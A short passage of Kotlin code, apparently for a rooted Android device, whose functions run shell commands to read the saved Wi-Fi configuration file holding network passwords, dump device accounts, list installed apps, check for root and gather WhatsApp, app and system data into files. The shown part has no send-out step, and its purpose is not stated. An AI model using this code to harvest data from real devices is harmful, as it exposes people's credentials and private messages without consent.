                  File(d, "wifi.xml").writeText(exec("cat /data/misc/wifi/WifiConfigStore.xml"))
                  File(d, "contas.txt").writeText(exec("dumpsys account"))
                  File(d, "pacotes.txt").writeText(exec("pm list packages -3"))
              }
              fun coletarTudo(d: File) {
                  whatsapp(File(d, "whatsapp")); apps(File(d, "apps")); sistema(File(d, "sistema"))
                  File(d, "su.txt").writeText(exec("su -v"))
              }
          }
          EOF

